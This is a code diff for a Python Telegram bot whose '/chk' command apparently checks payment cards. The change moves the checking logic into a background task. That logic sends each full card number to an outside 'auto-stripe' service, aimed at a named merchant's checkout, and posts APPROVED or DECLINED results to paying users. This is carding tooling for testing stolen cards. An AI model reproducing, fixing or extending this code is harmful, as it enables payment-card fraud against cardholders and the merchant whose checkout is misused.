@@ -727,19 +727,71 @@ async def consume_credit(user_id: int) -> bool:
         return True
     return False
 
-# ⚠️ This is a SYNCHRONOUS, BLOCKING function.
-# It simulates a blocking API call with time.sleep().
+# This is a synchronous, blocking function that simulates an API call.
 def get_bin_details_sync(bin_number: str) -> dict:
     """Simulates a blocking BIN lookup call."""
-    time.sleep(1.5)  # Simulating a blocking network delay
+    time.sleep(1.5)  # Simulating blocking delay
     return {
         "scheme": "Visa",
         "type": "Credit",
         "country_name": "United States"
     }
 
+async def background_check(cc_normalized, parts, user, user_data, processing_msg):
+    start_time = time.time()
+    try:
+        bin_number = parts[0][:6]
+        bin_details = await asyncio.to_thread(get_bin_details_sync, bin_number)
+        if bin_details is None:
+            bin_details = {}
+        brand = (bin_details.get("scheme") or "N/A").upper()
+        issuer = (bin_details.get("type") or "N/A").upper()
+        country_name = (bin_details.get("country_name") or "N/A").upper()
+
+        api_url = f"https://darkboy-auto-stripe.onrender.com/gateway=autostripe/key=darkboy/site=buildersdiscountwarehouse.com.au/cc={cc_normalized}"
+        async with aiohttp.ClientSession() as session:
+            async with session.get(api_url, timeout=25) as resp:
+                if resp.status != 200:
+                    raise Exception(f"HTTP {resp.status}")
+                data = await resp.json()
+
+        api_status = (data.get("status") or "Unknown").title()
+        api_response = data.get("response") or "N/A"
+        time_taken = round(time.time() - start_time, 2)
+
+        if api_status.lower() == "approved":
+            header = "❖❖❖\\[ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅ \\]❖❖❖"
+        elif api_status.lower() == "declined":
+            header = "❖❖❖\\[ 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌ \\]❖❖❖"
+        else:
+            header = f"❖❖❖\\[ {escape_markdown(api_status, version=2)} \\]❖❖❖"
+
+        formatted_response = f"_{escape_markdown(api_response, version=2)}_"
+
+        final_text = (
+            f"{header}\n"
+            f"✘ Card        ➜ `{escape_markdown(cc_normalized, version=2)}`\n"
+            "✘ Gateway     ➜ 𝓢𝘁𝗿𝗶𝗽𝗲 𝘈𝘂𝘁𝗵\n"
+            f"✘ Response    ➜ {formatted_response}\n"
+            "――――――――――――――――\n"
+            f"✘ Brand       ➜ {escape_markdown(brand, version=2)}\n"
+            f"✘ Issuer      ➜ {escape_markdown(issuer, version=2)}\n"
+            f"✘ Country    ➜ {escape_markdown(country_name, version=2)}\n"
+            "――――――――――――――――\n"
+            f"✘ Request By  ➜ {escape_markdown(user.first_name, version=2)}\\[{escape_markdown(user_data.get('plan','Free'), version=2)}\\]\n"
+            "✘ Developer   ➜ [kคli liຖนxx](https://t.me/K4linuxx)\n"
+            f"✘ Time        ➜ {escape_markdown(str(time_taken), version=2)} seconds\n"
+            "――――――――――――――――"
+        )
+        await processing_msg.edit_text(final_text, parse_mode=ParseMode.MARKDOWN_V2)
+
+    except Exception as e:
+        await processing_msg.edit_text(
+            f"❌ API Error: `{escape_markdown(str(e), version=2)}`",
+            parse_mode=ParseMode.MARKDOWN_V2
+        )
+
 async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Beast /chk: processing box -> BIN lookup + Darkboy API -> edit to final box."""
     user = update.effective_user
     user_id = user.id
 
@@ -789,63 +841,8 @@ async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode=ParseMode.MARKDOWN_V2
     )
 
-    start_time = time.time()
-
-    try:
-        # ⚠️ This is the crucial fix ⚠️
-        # We run the synchronous function in a separate thread, which prevents blocking.
-        bin_number = parts[0][:6]
-        bin_details = await asyncio.to_thread(get_bin_details_sync, bin_number)
-        
-        if bin_details is None:
-            bin_details = {}
-        brand = (bin_details.get("scheme") or "N/A").upper()
-        issuer = (bin_details.get("type") or "N/A").upper()
-        country_name = (bin_details.get("country_name") or "N/A").upper()
-        
-        # The aiohttp call is already non-blocking and uses await correctly.
-        api_url = f"https://darkboy-auto-stripe.onrender.com/gateway=autostripe/key=darkboy/site=buildersdiscountwarehouse.com.au/cc={cc_normalized}"
-        async with aiohttp.ClientSession() as session:
-            async with session.get(api_url, timeout=25) as resp:
-                if resp.status != 200:
-                    raise Exception(f"HTTP {resp.status}")
-                data = await resp.json()
-
-        api_status = (data.get("status") or "Unknown").title()
-        api_response = data.get("response") or "N/A"
-        time_taken = round(time.time() - start_time, 2)
-
-        if api_status.lower() == "approved":
-            header = "❖❖❖\\[ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅ \\]❖❖❖"
-        elif api_status.lower() == "declined":
-            header = "❖❖❖\\[ 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌ \\]❖❖❖"
-        else:
-            header = f"❖❖❖\\[ {escape_markdown(api_status, version=2)} \\]❖❖❖"
-
-        formatted_response = f"_{escape_markdown(api_response, version=2)}_"
-
-        final_text = (
-            f"{header}\n"
-            f"✘ Card        ➜ `{escape_markdown(cc_normalized, version=2)}`\n"
-            "✘ Gateway     ➜ 𝓢𝘁𝗿𝗶𝗽𝗲 𝘈𝘂𝘁𝗵\n"
-            f"✘ Response    ➜ {formatted_response}\n"
-            "――――――――――――――――\n"
-            f"✘ Brand       ➜ {escape_markdown(brand, version=2)}\n"
-            f"✘ Issuer      ➜ {escape_markdown(issuer, version=2)}\n"
-            f"✘ Country    ➜ {escape_markdown(country_name, version=2)}\n"
-            "――――――――――――――――\n"
-            f"✘ Request By  ➜ {escape_markdown(user.first_name, version=2)}\\[{escape_markdown(user_data.get('plan','Free'), version=2)}\\]\n"
-            "✘ Developer   ➜ [kคli liຖนxx](https://t.me/K4linuxx)\n"
-            f"✘ Time        ➜ {escape_markdown(str(time_taken), version=2)} seconds\n"
-            "――――――――――――――――"
-        )
-        await processing_msg.edit_text(final_text, parse_mode=ParseMode.MARKDOWN_V2)
-
-    except Exception as e:
-        await processing_msg.edit_text(
-            f"❌ API Error: `{escape_markdown(str(e), version=2)}`",
-            parse_mode=ParseMode.MARKDOWN_V2
-        )
+    # Start the card check in background — bot stays responsive immediately
+    asyncio.create_task(background_check(cc_normalized, parts, user, user_data, processing_msg))
 
 
 
